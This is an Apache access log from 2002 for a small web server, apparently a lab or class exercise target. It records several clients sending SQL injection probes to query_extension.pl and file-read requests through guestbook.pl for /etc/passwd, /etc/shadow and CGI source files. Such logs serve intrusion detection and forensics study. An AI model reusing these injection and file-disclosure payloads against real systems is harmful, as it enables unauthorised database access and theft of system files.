128.111.43.73 - - [06/Dec/2002:12:44:56 -0800] "GET /cgi-bin/query_extension.pl?cboname=%27+%3B+SELECT+*+FROM+Employees+--%27 HTTP/1.0" 200 357 "http://128.111.48.15/contact.html" "Mozilla/4.79 [en] (X11; U; Linux 2.4.18-17.7.x i686)"
128.111.43.73 - - [06/Dec/2002:12:45:09 -0800] "GET /cgi-bin/query_extension.pl?cboname=%27%3BSELECT+*+FROM+Employees--%27 HTTP/1.0" 200 351 "http://128.111.48.15/contact.html" "Mozilla/4.79 [en] (X11; U; Linux 2.4.18-17.7.x i686)"
128.111.43.73 - - [06/Dec/2002:12:45:14 -0800] "GET /cgi-bin/query_extension.pl?cboname=%27%3BSELECT+*+FROM+Employees+%3B--%27 HTTP/1.0" 200 355 "http://128.111.48.15/contact.html" "Mozilla/4.79 [en] (X11; U; Linux 2.4.18-17.7.x i686)"
128.111.43.73 - - [06/Dec/2002:12:45:19 -0800] "GET /cgi-bin/query_extension.pl?cboname=%27%3BSELECT+*+FROM+Employees+%3B+--%27 HTTP/1.0" 200 357 "http://128.111.48.15/contact.html" "Mozilla/4.79 [en] (X11; U; Linux 2.4.18-17.7.x i686)"
128.111.43.73 - - [06/Dec/2002:12:45:29 -0800] "GET /cgi-bin/query_extension.pl?cboname=%27%3B--%27 HTTP/1.0" 200 305 "http://128.111.48.15/contact.html" "Mozilla/4.79 [en] (X11; U; Linux 2.4.18-17.7.x i686)"
128.111.43.73 - - [06/Dec/2002:12:45:34 -0800] "GET /cgi-bin/query_extension.pl?cboname=%27-%27-%27 HTTP/1.0" 200 309 "http://128.111.48.15/contact.html" "Mozilla/4.79 [en] (X11; U; Linux 2.4.18-17.7.x i686)"
128.111.43.73 - - [06/Dec/2002:12:45:38 -0800] "GET /cgi-bin/query_extension.pl?cboname=%27-%3B-%27 HTTP/1.0" 200 305 "http://128.111.48.15/contact.html" "Mozilla/4.79 [en] (X11; U; Linux 2.4.18-17.7.x i686)"
128.111.43.73 - - [06/Dec/2002:12:45:51 -0800] "GET /cgi-bin/query_extension.pl?cboname=Leo%27-- HTTP/1.0" 200 303 "http://128.111.48.15/contact.html" "Mozilla/4.79 [en] (X11; U; Linux 2.4.18-17.7.x i686)"
128.111.43.73 - - [06/Dec/2002:12:45:53 -0800] "GET /cgi-bin/query_extension.pl?cboname=Leo%27--%27 HTTP/1.0" 200 1244 "http://128.111.48.15/contact.html" "Mozilla/4.79 [en] (X11; U; Linux 2.4.18-17.7.x i686)"
128.111.43.73 - - [06/Dec/2002:12:46:50 -0800] "GET /cgi-bin/query_extension.pl?cboname=%27SELECT+*+FROM+Employees%27%27--%27 HTTP/1.0" 200 361 "http://128.111.48.15/contact.html" "Mozilla/4.79 [en] (X11; U; Linux 2.4.18-17.7.x i686)"
128.111.43.73 - - [06/Dec/2002:12:46:57 -0800] "GET /cgi-bin/query_extension.pl?cboname=%3BSELECT+*+FROM+Employees%27%27--%27 HTTP/1.0" 200 357 "http://128.111.48.15/contact.html" "Mozilla/4.79 [en] (X11; U; Linux 2.4.18-17.7.x i686)"
128.111.43.73 - - [06/Dec/2002:12:47:02 -0800] "GET /cgi-bin/query_extension.pl?cboname=%3BSELECT+*+FROM+Employees%3B%27--%27 HTTP/1.0" 200 1288 "http://128.111.48.15/contact.html" "Mozilla/4.79 [en] (X11; U; Linux 2.4.18-17.7.x i686)"
128.111.43.73 - - [06/Dec/2002:12:47:23 -0800] "GET /cgi-bin/query_extension.pl?cboname=%27--%27 HTTP/1.0" 200 1238 "http://128.111.48.15/contact.html" "Mozilla/4.79 [en] (X11; U; Linux 2.4.18-17.7.x i686)"
128.111.43.73 - - [06/Dec/2002:12:47:32 -0800] "GET /cgi-bin/query_extension.pl?cboname=%27--%27%3B+SELECT+*+FROM+Employees HTTP/1.0" 200 1288 "http://128.111.48.15/contact.html" "Mozilla/4.79 [en] (X11; U; Linux 2.4.18-17.7.x i686)"
128.111.43.73 - - [06/Dec/2002:12:47:38 -0800] "GET /cgi-bin/query_extension.pl?cboname=%27--%27%3B+%27SELECT+*+FROM+Employees HTTP/1.0" 200 359 "http://128.111.48.15/contact.html" "Mozilla/4.79 [en] (X11; U; Linux 2.4.18-17.7.x i686)"
128.111.43.73 - - [06/Dec/2002:12:47:43 -0800] "GET /cgi-bin/query_extension.pl?cboname=%27--%27%3B+%27SELECT+*+FROM+Employees%27 HTTP/1.0" 200 365 "http://128.111.48.15/contact.html" "Mozilla/4.79 [en] (X11; U; Linux 2.4.18-17.7.x i686)"
128.111.43.73 - - [06/Dec/2002:12:47:55 -0800] "GET /cgi-bin/query_extension.pl?cboname=%27--%27%3B+%27SELECT+*+FROM+Employees%27 HTTP/1.0" 200 365 "http://128.111.48.15/contact.html" "Mozilla/4.79 [en] (X11; U; Linux 2.4.18-17.7.x i686)"
128.111.43.73 - - [06/Dec/2002:12:48:27 -0800] "GET /cgi-bin/query_extension.pl?cboname=%27--%27%3B+%27SELECT+*+FROM+Employees%27 HTTP/1.0" 200 365 "http://128.111.48.15/contact.html" "Mozilla/4.79 [en] (X11; U; Linux 2.4.18-17.7.x i686)"
128.111.43.21 - - [06/Dec/2002:12:48:37 -0800] "GET /cgi-bin/query_extension.pl?cboname=%27+having+1%3D1+-- HTTP/1.1" 200 333 "http://128.111.48.15/contact.html" "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.0.1) Gecko/20021003"
128.111.43.21 - - [06/Dec/2002:12:48:45 -0800] "GET /cgi-bin/query_extension.pl?cboname=%27+having+1%3D1+--%27 HTTP/1.1" 200 353 "http://128.111.48.15/contact.html" "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.0.1) Gecko/20021003"
128.111.43.73 - - [06/Dec/2002:12:48:47 -0800] "GET /cgi-bin/query_extension.pl?cboname=%27--%27 HTTP/1.0" 200 1238 "http://128.111.48.15/contact.html" "Mozilla/4.79 [en] (X11; U; Linux 2.4.18-17.7.x i686)"
128.111.43.58 - - [06/Dec/2002:12:48:56 -0800] "GET /cgi-bin/guestbook.pl?/etc/shawdow HTTP/1.0" 200 322 "-" "Mozilla/4.79 [en] (X11; U; Linux 2.4.18-18.7.x i686)"
128.111.43.21 - - [06/Dec/2002:12:48:56 -0800] "GET /cgi-bin/query_extension.pl?cboname=%27--%27%3B HTTP/1.1" 200 1252 "http://128.111.48.15/contact.html" "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.0.1) Gecko/20021003"
128.111.43.58 - - [06/Dec/2002:12:48:57 -0800] "GET /cgi-bin/guestbook.pl?guestbook.txt HTTP/1.0" 200 599 "http://128.111.48.15/cgi-bin/save_message.pl?/" "Mozilla/4.79 [en] (X11; U; Linux 2.4.18-18.7.x i686)"
128.111.43.21 - - [06/Dec/2002:12:49:17 -0800] "GET /cgi-bin/query_extension.pl?cboname=%27--%27%3Bshow+databases%3B HTTP/1.1" 200 1282 "http://128.111.48.15/contact.html" "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.0.1) Gecko/20021003"
128.111.43.58 - - [06/Dec/2002:12:49:23 -0800] "GET /cgi-bin/save_message.pl?/ HTTP/1.0" 200 649 "-" "Mozilla/4.79 [en] (X11; U; Linux 2.4.18-18.7.x i686)"
128.111.43.58 - - [06/Dec/2002:12:49:25 -0800] "GET /cgi-bin/save_message.pl? HTTP/1.0" 200 649 "-" "Mozilla/4.79 [en] (X11; U; Linux 2.4.18-18.7.x i686)"
128.111.43.58 - - [06/Dec/2002:12:49:29 -0800] "GET /cgi-bin/ HTTP/1.0" 403 272 "-" "Mozilla/4.79 [en] (X11; U; Linux 2.4.18-18.7.x i686)"
128.111.43.21 - - [06/Dec/2002:12:49:30 -0800] "GET /cgi-bin/query_extension.pl?cboname=%27--%3Bshow+databases%3B HTTP/1.1" 200 341 "http://128.111.48.15/contact.html" "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.0.1) Gecko/20021003"
128.111.43.58 - - [06/Dec/2002:12:49:33 -0800] "GET / HTTP/1.0" 200 1494 "-" "Mozilla/4.79 [en] (X11; U; Linux 2.4.18-18.7.x i686)"
128.111.43.58 - - [06/Dec/2002:12:49:34 -0800] "GET /history.html HTTP/1.0" 200 1226 "http://128.111.48.15/" "Mozilla/4.79 [en] (X11; U; Linux 2.4.18-18.7.x i686)"
128.111.43.58 - - [06/Dec/2002:12:49:40 -0800] "GET /financial.html HTTP/1.0" 200 1369 "http://128.111.48.15/history.html" "Mozilla/4.79 [en] (X11; U; Linux 2.4.18-18.7.x i686)"
128.111.43.21 - - [06/Dec/2002:12:49:43 -0800] "GET /cgi-bin/query_extension.pl?cboname=Leo HTTP/1.1" 200 319 "http://128.111.48.15/contact.html" "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.0.1) Gecko/20021003"
128.111.43.73 - - [06/Dec/2002:12:49:54 -0800] "GET /cgi-bin/query_extension.pl?cboname=%27--%27%40%40version%2C1%2C1%2C1 HTTP/1.0" 200 1268 "http://128.111.48.15/contact.html" "Mozilla/4.79 [en] (X11; U; Linux 2.4.18-17.7.x i686)"
128.111.43.73 - - [06/Dec/2002:12:50:07 -0800] "GET /cgi-bin/query_extension.pl?cboname=%27%40%40version%2C1%2C1%2C1--%27 HTTP/1.0" 200 333 "http://128.111.48.15/contact.html" "Mozilla/4.79 [en] (X11; U; Linux 2.4.18-17.7.x i686)"
128.111.43.73 - - [06/Dec/2002:12:50:52 -0800] "GET /contact.html HTTP/1.0" 304 - "http://128.111.48.15/" "Mozilla/4.79 [en] (X11; U; Linux 2.4.18-17.7.x i686)"
128.111.43.73 - - [06/Dec/2002:12:50:52 -0800] "GET /basstard_title.png HTTP/1.0" 304 - "http://128.111.48.15/contact.html" "Mozilla/4.79 [en] (X11; U; Linux 2.4.18-17.7.x i686)"
128.111.43.73 - - [06/Dec/2002:12:51:07 -0800] "GET /cgi-bin/query_extension.pl?cboname=%27--SELECT+*+FROM+Employees--%27 HTTP/1.0" 200 353 "http://128.111.48.15/contact.html" "Mozilla/4.79 [en] (X11; U; Linux 2.4.18-17.7.x i686)"
128.111.43.73 - - [06/Dec/2002:12:51:37 -0800] "GET /cgi-bin/query_extension.pl?cboname=%27--%40version%2C1%2C1%2C1--%27 HTTP/1.0" 200 335 "http://128.111.48.15/contact.html" "Mozilla/4.79 [en] (X11; U; Linux 2.4.18-17.7.x i686)"
128.111.43.73 - - [06/Dec/2002:12:51:42 -0800] "GET /cgi-bin/query_extension.pl?cboname=%27--%40version%2C1%2C1%2C1--%27 HTTP/1.0" 200 335 "http://128.111.48.15/contact.html" "Mozilla/4.79 [en] (X11; U; Linux 2.4.18-17.7.x i686)"
128.111.43.73 - - [06/Dec/2002:12:52:35 -0800] "GET /cgi-bin/guestbook.pl?guestbook.txt HTTP/1.0" 200 599 "http://128.111.48.15/feedback.html" "Mozilla/4.79 [en] (X11; U; Linux 2.4.18-17.7.x i686)"
128.111.43.73 - - [06/Dec/2002:12:52:41 -0800] "GET /cgi-bin/guestbook.pl?/etc/resolv.conf HTTP/1.0" 200 370 "-" "Mozilla/4.79 [en] (X11; U; Linux 2.4.18-17.7.x i686)"
128.111.43.73 - - [06/Dec/2002:12:53:03 -0800] "GET /cgi-bin/guestbook.pl?/etc/hostname HTTP/1.0" 200 322 "-" "Mozilla/4.79 [en] (X11; U; Linux 2.4.18-17.7.x i686)"
128.111.43.25 - - [06/Dec/2002:12:54:09 -0800] "GET /cgi-bin/guestbook.pl?guestbook.txt HTTP/1.1" 200 632 "http://128.111.48.15/feedback.html" "Mozilla/5.0 (compatible; Konqueror/3; Linux)"
128.111.43.25 - - [06/Dec/2002:12:54:36 -0800] "GET /cgi-bin/guestbook.pl?/etc/passwd HTTP/1.1" 200 1924 "-" "Mozilla/5.0 (compatible; Konqueror/3; Linux)"
128.111.43.73 - - [06/Dec/2002:12:55:05 -0800] "GET /cgi-bin/guestbook.pl?/var/www/cgi-bin/save_message.pl HTTP/1.0" 200 1141 "-" "Mozilla/4.79 [en] (X11; U; Linux 2.4.18-17.7.x i686)"
128.111.43.73 - - [06/Dec/2002:12:55:23 -0800] "GET /cgi-bin/query_extension.pl?cboname=%27--%40%40version%2C1%2C1%2C1--%27 HTTP/1.0" 200 - "http://128.111.48.15/contact.html" "Mozilla/4.79 [en] (X11; U; Linux 2.4.18-17.7.x i686)"
128.111.43.73 - - [06/Dec/2002:12:55:58 -0800] "GET /cgi-bin/query_extension.pl?cboname=%27--%40%40version%2C1%2C1%2C1--%27 HTTP/1.0" 200 - "http://128.111.48.15/contact.html" "Mozilla/4.79 [en] (X11; U; Linux 2.4.18-17.7.x i686)"
128.111.43.73 - - [06/Dec/2002:12:56:21 -0800] "POST /cgi-bin/save_message.pl HTTP/1.0" 200 668 "http://128.111.48.15/feedback.html" "Mozilla/4.79 [en] (X11; U; Linux 2.4.18-17.7.x i686)"
128.111.43.73 - - [06/Dec/2002:12:56:21 -0800] "GET /cgi-bin/query_extension.pl?cboname=%27--%40%40version%2C1%2C1%2C1--%27 HTTP/1.0" 200 - "http://128.111.48.15/contact.html" "Mozilla/4.79 [en] (X11; U; Linux 2.4.18-17.7.x i686)"
128.111.43.73 - - [06/Dec/2002:12:56:37 -0800] "GET /cgi-bin/guestbook.pl?guestbook.txt HTTP/1.0" 200 599 "http://128.111.48.15/feedback.html" "Mozilla/4.79 [en] (X11; U; Linux 2.4.18-17.7.x i686)"
128.111.43.73 - - [06/Dec/2002:12:56:44 -0800] "GET /cgi-bin/guestbook.pl?/var/www/htdocs/index.html HTTP/1.0" 200 322 "-" "Mozilla/4.79 [en] (X11; U; Linux 2.4.18-17.7.x i686)"
128.111.43.73 - - [06/Dec/2002:12:56:48 -0800] "GET /cgi-bin/guestbook.pl?/var/www/html/index.html HTTP/1.0" 200 1816 "-" "Mozilla/4.79 [en] (X11; U; Linux 2.4.18-17.7.x i686)"
128.111.43.73 - - [06/Dec/2002:12:56:48 -0800] "GET /cgi-bin/basstard.png HTTP/1.0" 404 280 "http://128.111.48.15/cgi-bin/guestbook.pl?/var/www/html/index.html" "Mozilla/4.79 [en] (X11; U; Linux 2.4.18-17.7.x i686)"
128.111.43.73 - - [06/Dec/2002:12:56:48 -0800] "GET /cgi-bin/basstard_title.png HTTP/1.0" 404 286 "http://128.111.48.15/cgi-bin/guestbook.pl?/var/www/html/index.html" "Mozilla/4.79 [en] (X11; U; Linux 2.4.18-17.7.x i686)"
128.111.43.73 - - [06/Dec/2002:12:56:52 -0800] "GET /cgi-bin/query_extension.pl?cboname=%27--%40%40version%2C1%2C1%2C1--%27 HTTP/1.0" 200 - "http://128.111.48.15/contact.html" "Mozilla/4.79 [en] (X11; U; Linux 2.4.18-17.7.x i686)"
128.111.43.21 - - [06/Dec/2002:12:56:54 -0800] "GET /cgi-bin/query_extension.pl?cboname=Schmidt HTTP/1.1" 200 349 "http://128.111.48.15/contact.html" "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.0.1) Gecko/20021003"
128.111.43.73 - - [06/Dec/2002:12:57:11 -0800] "POST /cgi-bin/save_message.pl HTTP/1.0" 200 633 "http://128.111.48.15/feedback.html" "Mozilla/4.79 [en] (X11; U; Linux 2.4.18-17.7.x i686)"
128.111.43.21 - - [06/Dec/2002:12:57:16 -0800] "GET /cgi-bin/query_extension.pl?cboname=Schmidt HTTP/1.1" 200 349 "http://128.111.48.15/contact.html" "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.0.1) Gecko/20021003"
128.111.43.73 - - [06/Dec/2002:12:57:16 -0800] "GET /testing.html HTTP/1.0" 200 59 "-" "Mozilla/4.79 [en] (X11; U; Linux 2.4.18-17.7.x i686)"
128.111.43.73 - - [06/Dec/2002:12:57:37 -0800] "GET /cgi-bin/guestbook.pl?guestbook.txt HTTP/1.0" 200 599 "http://128.111.48.15/cgi-bin/save_message.pl" "Mozilla/4.79 [en] (X11; U; Linux 2.4.18-17.7.x i686)"
128.111.43.73 - - [06/Dec/2002:12:57:51 -0800] "GET /cgi-bin/guestbook.pl?/var/www/cgi-bin/save_message.pl HTTP/1.0" 200 1141 "-" "Mozilla/4.79 [en] (X11; U; Linux 2.4.18-17.7.x i686)"
128.111.43.73 - - [06/Dec/2002:13:01:59 -0800] "GET /cgi-bin/query_extension.pl?cboname=%27-- HTTP/1.0" 200 297 "http://128.111.48.15/contact.html" "Mozilla/4.79 [en] (X11; U; Linux 2.4.18-17.7.x i686)"
128.111.43.73 - - [06/Dec/2002:13:02:02 -0800] "GET /cgi-bin/query_extension.pl?cboname=%27--%3B HTTP/1.0" 200 299 "http://128.111.48.15/contact.html" "Mozilla/4.79 [en] (X11; U; Linux 2.4.18-17.7.x i686)"
128.111.20.70 - - [06/Dec/2002:13:05:05 -0800] "GET /feedback.html HTTP/1.1" 200 1307 "http://128.111.48.15/" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; Q312461)"
128.111.20.70 - - [06/Dec/2002:13:05:05 -0800] "GET /basstard.css HTTP/1.1" 304 - "http://128.111.48.15/feedback.html" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; Q312461)"
128.111.20.70 - - [06/Dec/2002:13:05:08 -0800] "GET /basstard_title.png HTTP/1.1" 304 - "http://128.111.48.15/feedback.html" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; Q312461)"
128.111.43.58 - - [06/Dec/2002:13:05:12 -0800] "GET / HTTP/1.0" 200 1494 "-" "Mozilla/4.79 [en] (X11; U; Linux 2.4.18-18.7.x i686)"
128.111.43.58 - - [06/Dec/2002:13:05:16 -0800] "GET / HTTP/1.0" 200 1494 "-" "Mozilla/4.79 [en] (X11; U; Linux 2.4.18-18.7.x i686)"
128.111.20.70 - - [06/Dec/2002:13:05:30 -0800] "GET /history.html HTTP/1.1" 200 1226 "http://128.111.48.15/" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; Q312461)"
128.111.20.70 - - [06/Dec/2002:13:05:30 -0800] "GET /basstard_title.png HTTP/1.1" 304 - "http://128.111.48.15/history.html" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; Q312461)"
128.111.20.70 - - [06/Dec/2002:13:05:33 -0800] "GET /basstard.css HTTP/1.1" 304 - "http://128.111.48.15/history.html" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; Q312461)"
128.111.43.58 - - [06/Dec/2002:13:05:41 -0800] "GET /history.html HTTP/1.0" 200 1226 "http://128.111.48.15/" "Mozilla/4.79 [en] (X11; U; Linux 2.4.18-18.7.x i686)"
128.111.43.58 - - [06/Dec/2002:13:05:54 -0800] "GET /financial.html HTTP/1.0" 200 1369 "http://128.111.48.15/history.html" "Mozilla/4.79 [en] (X11; U; Linux 2.4.18-18.7.x i686)"
128.111.43.58 - - [06/Dec/2002:13:06:15 -0800] "GET /history.html HTTP/1.0" 200 1226 "http://128.111.48.15/" "Mozilla/4.79 [en] (X11; U; Linux 2.4.18-18.7.x i686)"
128.111.43.58 - - [06/Dec/2002:13:06:19 -0800] "GET / HTTP/1.0" 200 1494 "-" "Mozilla/4.79 [en] (X11; U; Linux 2.4.18-18.7.x i686)"
128.111.43.58 - - [06/Dec/2002:13:06:29 -0800] "GET /contact.html HTTP/1.0" 200 1286 "http://128.111.48.15/" "Mozilla/4.79 [en] (X11; U; Linux 2.4.18-18.7.x i686)"
128.111.43.58 - - [06/Dec/2002:13:06:31 -0800] "GET / HTTP/1.0" 200 1494 "-" "Mozilla/4.79 [en] (X11; U; Linux 2.4.18-18.7.x i686)"
128.111.43.58 - - [06/Dec/2002:13:06:32 -0800] "GET /feedback.html HTTP/1.0" 200 1307 "http://128.111.48.15/" "Mozilla/4.79 [en] (X11; U; Linux 2.4.18-18.7.x i686)"
128.111.43.58 - - [06/Dec/2002:13:06:35 -0800] "GET /cgi-bin/guestbook.pl?guestbook.txt HTTP/1.0" 200 599 "http://128.111.48.15/feedback.html" "Mozilla/4.79 [en] (X11; U; Linux 2.4.18-18.7.x i686)"
128.111.43.58 - - [06/Dec/2002:13:08:24 -0800] "GET /feedback.html HTTP/1.0" 200 1307 "http://128.111.48.15/" "Mozilla/4.79 [en] (X11; U; Linux 2.4.18-18.7.x i686)"
128.111.43.58 - - [06/Dec/2002:13:08:26 -0800] "GET / HTTP/1.0" 200 1494 "-" "Mozilla/4.79 [en] (X11; U; Linux 2.4.18-18.7.x i686)"
128.111.43.58 - - [06/Dec/2002:13:08:46 -0800] "GET /contact.html HTTP/1.0" 200 1286 "http://128.111.48.15/" "Mozilla/4.79 [en] (X11; U; Linux 2.4.18-18.7.x i686)"
128.111.43.58 - - [06/Dec/2002:13:11:03 -0800] "GET / HTTP/1.0" 200 1494 "-" "Mozilla/4.79 [en] (X11; U; Linux 2.4.18-18.7.x i686)"
128.111.43.58 - - [06/Dec/2002:13:11:05 -0800] "GET /feedback.html HTTP/1.0" 200 1307 "http://128.111.48.15/" "Mozilla/4.79 [en] (X11; U; Linux 2.4.18-18.7.x i686)"
128.111.43.73 - - [06/Dec/2002:13:11:12 -0800] "GET /mrtg HTTP/1.0" 301 292 "-" "Mozilla/4.79 [en] (X11; U; Linux 2.4.18-17.7.x i686)"
128.111.43.73 - - [06/Dec/2002:13:11:20 -0800] "GET /mrtg/ HTTP/1.0" 200 18743 "-" "Mozilla/4.79 [en] (X11; U; Linux 2.4.18-17.7.x i686)"
128.111.43.73 - - [06/Dec/2002:13:11:20 -0800] "GET /mrtg/mrtg-r.png HTTP/1.0" 200 1759 "http://128.111.48.15/mrtg/" "Mozilla/4.79 [en] (X11; U; Linux 2.4.18-17.7.x i686)"
128.111.43.73 - - [06/Dec/2002:13:11:20 -0800] "GET /mrtg/mrtg-m.png HTTP/1.0" 200 414 "http://128.111.48.15/mrtg/" "Mozilla/4.79 [en] (X11; U; Linux 2.4.18-17.7.x i686)"
128.111.43.73 - - [06/Dec/2002:13:11:20 -0800] "GET /mrtg/mrtg-l.png HTTP/1.0" 200 538 "http://128.111.48.15/mrtg/" "Mozilla/4.79 [en] (X11; U; Linux 2.4.18-17.7.x i686)"
128.111.43.73 - - [06/Dec/2002:13:11:20 -0800] "GET /mrtg/mrtg-ti.gif HTTP/1.0" 200 4696 "http://128.111.48.15/mrtg/" "Mozilla/4.79 [en] (X11; U; Linux 2.4.18-17.7.x i686)"
128.111.43.73 - - [06/Dec/2002:13:11:59 -0800] "GET /mrtg/logfile.html HTTP/1.0" 200 4053 "-" "Mozilla/4.79 [en] (X11; U; Linux 2.4.18-17.7.x i686)"
128.111.43.73 - - [06/Dec/2002:13:11:59 -0800] "GET /mrtg/mrtg-r.gif HTTP/1.0" 200 1779 "http://128.111.48.15/mrtg/logfile.html" "Mozilla/4.79 [en] (X11; U; Linux 2.4.18-17.7.x i686)"
128.111.43.73 - - [06/Dec/2002:13:12:11 -0800] "GET /mrtg/mrtg-l.gif HTTP/1.0" 200 343 "-" "Mozilla/4.79 [en] (X11; U; Linux 2.4.18-17.7.x i686)"
128.111.43.73 - - [06/Dec/2002:13:12:23 -0800] "GET /usage HTTP/1.0" 301 293 "-" "Mozilla/4.79 [en] (X11; U; Linux 2.4.18-17.7.x i686)"
128.111.43.73 - - [06/Dec/2002:13:12:27 -0800] "GET /usage/ HTTP/1.0" 200 3675 "-" "Mozilla/4.79 [en] (X11; U; Linux 2.4.18-17.7.x i686)"
128.111.43.73 - - [06/Dec/2002:13:12:27 -0800] "GET /usage/usage.png HTTP/1.0" 200 2078 "http://128.111.48.15/usage/" "Mozilla/4.79 [en] (X11; U; Linux 2.4.18-17.7.x i686)"
128.111.43.73 - - [06/Dec/2002:13:12:33 -0800] "GET /usage/usage_200212.html HTTP/1.0" 200 44192 "http://128.111.48.15/usage/" "Mozilla/4.79 [en] (X11; U; Linux 2.4.18-17.7.x i686)"
128.111.43.73 - - [06/Dec/2002:13:12:33 -0800] "GET /usage/hourly_usage_200212.png HTTP/1.0" 200 1750 "http://128.111.48.15/usage/usage_200212.html" "Mozilla/4.79 [en] (X11; U; Linux 2.4.18-17.7.x i686)"
128.111.43.73 - - [06/Dec/2002:13:12:33 -0800] "GET /usage/daily_usage_200212.png HTTP/1.0" 200 2665 "http://128.111.48.15/usage/usage_200212.html" "Mozilla/4.79 [en] (X11; U; Linux 2.4.18-17.7.x i686)"
128.111.43.73 - - [06/Dec/2002:13:12:33 -0800] "GET /usage/ctry_usage_200212.png HTTP/1.0" 200 2292 "http://128.111.48.15/usage/usage_200212.html" "Mozilla/4.79 [en] (X11; U; Linux 2.4.18-17.7.x i686)"
128.111.43.58 - - [06/Dec/2002:13:19:32 -0800] "GET /cgi-bin/guestbook.pl?guestbook.txt HTTP/1.0" 200 599 "http://128.111.48.15/feedback.html" "Mozilla/4.79 [en] (X11; U; Linux 2.4.18-18.7.x i686)"
128.111.43.58 - - [06/Dec/2002:13:20:41 -0800] "GET /feedback.html HTTP/1.0" 200 1307 "http://128.111.48.15/" "Mozilla/4.79 [en] (X11; U; Linux 2.4.18-18.7.x i686)"
128.111.43.58 - - [06/Dec/2002:13:20:42 -0800] "GET / HTTP/1.0" 200 1494 "-" "Mozilla/4.79 [en] (X11; U; Linux 2.4.18-18.7.x i686)"
128.111.43.58 - - [06/Dec/2002:13:20:42 -0800] "GET /basstard.png HTTP/1.0" 200 18660 "http://128.111.48.15/" "Mozilla/4.79 [en] (X11; U; Linux 2.4.18-18.7.x i686)"
128.111.43.58 - - [06/Dec/2002:13:21:30 -0800] "GET /contact.html HTTP/1.0" 200 1286 "http://128.111.48.15/" "Mozilla/4.79 [en] (X11; U; Linux 2.4.18-18.7.x i686)"
128.111.43.58 - - [06/Dec/2002:13:21:41 -0800] "GET /cgi-bin/query_extension.pl?cboname=leanardo HTTP/1.0" 200 317 "http://128.111.48.15/contact.html" "Mozilla/4.79 [en] (X11; U; Linux 2.4.18-18.7.x i686)"
128.111.41.12 - - [06/Dec/2002:13:23:31 -0800] "GET /serviced HTTP/1.0" 200 3911 "-" "Wget/1.8.1"
128.111.43.38 - - [06/Dec/2002:13:24:09 -0800] "GET / HTTP/1.1" 304 - "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; Q312461)"
128.111.43.38 - - [06/Dec/2002:13:24:09 -0800] "GET /basstard.css HTTP/1.1" 304 - "http://128.111.48.15/" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; Q312461)"
128.111.43.38 - - [06/Dec/2002:13:24:09 -0800] "GET /basstard_title.png HTTP/1.1" 304 - "http://128.111.48.15/" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; Q312461)"
128.111.43.38 - - [06/Dec/2002:13:24:09 -0800] "GET /basstard.png HTTP/1.1" 304 - "http://128.111.48.15/" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; Q312461)"
128.111.43.72 - - [06/Dec/2002:13:25:30 -0800] "GET /feedback.html HTTP/1.1" 304 - "http://128.111.48.15/" "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.0.1) Gecko/20021003"
128.111.43.72 - - [06/Dec/2002:13:27:11 -0800] "GET /*.pl HTTP/1.1" 404 276 "-" "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.0.1) Gecko/20021003"
128.111.43.72 - - [06/Dec/2002:13:27:21 -0800] "GET /pwd.pl HTTP/1.1" 404 278 "-" "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.0.1) Gecko/20021003"
128.111.43.59 - - [06/Dec/2002:13:27:29 -0800] "GET / HTTP/1.1" 200 1494 "-" "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.0.1) Gecko/20021003"
128.111.43.59 - - [06/Dec/2002:13:27:29 -0800] "GET /basstard.css HTTP/1.1" 200 793 "http://128.111.48.15/" "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.0.1) Gecko/20021003"
128.111.43.59 - - [06/Dec/2002:13:27:30 -0800] "GET /basstard_title.png HTTP/1.1" 200 5316 "http://128.111.48.15/" "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.0.1) Gecko/20021003"
128.111.43.59 - - [06/Dec/2002:13:27:30 -0800] "GET /basstard.png HTTP/1.1" 200 18660 "http://128.111.48.15/" "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.0.1) Gecko/20021003"
128.111.43.72 - - [06/Dec/2002:13:27:35 -0800] "GET /userpwds.pl HTTP/1.1" 404 283 "-" "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.0.1) Gecko/20021003"
128.111.43.38 - - [06/Dec/2002:13:27:39 -0800] "GET /history.html HTTP/1.1" 200 1226 "http://128.111.48.15/" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; Q312461)"
128.111.43.38 - - [06/Dec/2002:13:27:44 -0800] "GET /contact.html HTTP/1.1" 304 - "http://128.111.48.15/" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; Q312461)"
128.111.43.38 - - [06/Dec/2002:13:27:47 -0800] "GET /feedback.html HTTP/1.1" 200 1307 "http://128.111.48.15/" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; Q312461)"
128.111.43.38 - - [06/Dec/2002:13:28:27 -0800] "GET /cgi-bin/guestbook.pl?guestbook.txt HTTP/1.1" 200 632 "http://128.111.48.15/feedback.html" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; Q312461)"
128.111.43.72 - - [06/Dec/2002:13:28:48 -0800] "GET /pwd.pl HTTP/1.1" 404 278 "-" "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.0.1) Gecko/20021003"
